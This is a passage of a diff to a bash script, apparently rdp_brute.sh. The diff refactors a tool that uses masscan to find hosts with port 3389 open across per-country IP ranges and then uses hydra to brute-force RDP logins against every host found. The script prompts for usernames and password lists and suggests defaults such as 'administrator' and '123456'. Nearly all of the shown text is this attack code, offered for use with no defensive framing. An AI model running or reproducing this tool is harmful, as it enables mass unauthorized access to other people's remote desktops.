-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23804,6 +9573,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23813,53 +9583,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "111" ]; then
@@ -23876,6 +9600,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23885,53 +9610,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -23949,6 +9628,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -23958,53 +9638,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24022,6 +9656,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24031,53 +9666,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24095,6 +9684,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24104,53 +9694,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24168,6 +9712,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24177,53 +9722,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24241,6 +9740,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24250,53 +9750,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24314,6 +9768,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24323,53 +9778,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 else
 if [ "$country" = "118" ]; then
@@ -24386,6 +9795,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24395,53 +9805,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24459,6 +9823,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24468,53 +9833,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24532,6 +9851,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24541,53 +9861,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24605,6 +9879,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24614,53 +9889,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24678,6 +9907,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24687,53 +9917,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENUEN
 
 
 else
@@ -24751,6 +9935,7 @@ echo ""
 echo "To exit scan mode 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Hosts open port 3389 written to the file $PWD/open3389"
 
@@ -24760,53 +9945,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Select method.."
-echo "1. Enter your login and specify the path to the file list passwords: "; 
-echo "2. Specify the path to the file list with the login and password to enter: ";
-echo "3. Specify the path to the file list with login and password: ";
-echo "4. Proceed to the brute force method by default: ";
-read -p "   Сhoose from a menu : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Enter username {administrator, admin & etc.} : " loginbrute
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Specify the path to the file containing the list of usernames {'/home/dictionary/users'}: " loginlist
-read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Press enter to return to the Main menu "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
